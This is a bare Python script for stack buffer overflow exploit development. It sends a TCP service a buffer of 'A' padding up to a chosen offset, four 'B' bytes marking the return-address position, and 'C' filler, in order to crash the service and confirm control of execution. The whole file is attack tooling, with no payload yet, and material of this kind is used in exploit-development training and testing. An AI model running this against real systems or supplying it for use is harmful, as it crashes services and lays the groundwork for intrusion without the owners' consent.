import socket
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('-t', '--target', required=True)
parser.add_argument('-p', '--port', type=int, required=True)
parser.add_argument('-o', '--offset', type=int, required=True)
parser.add_argument('-l', '--length', type=int, required=True)

args = parser.parse_args()

buffer = 'A' * args.offset + 'B' * 4 + 'C' * (args.length - args.offset - 4)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(2)
s.connect((args.target, args.port))
s.recv(1024)

s.send((buffer + '\r\n').encode())
s.close()
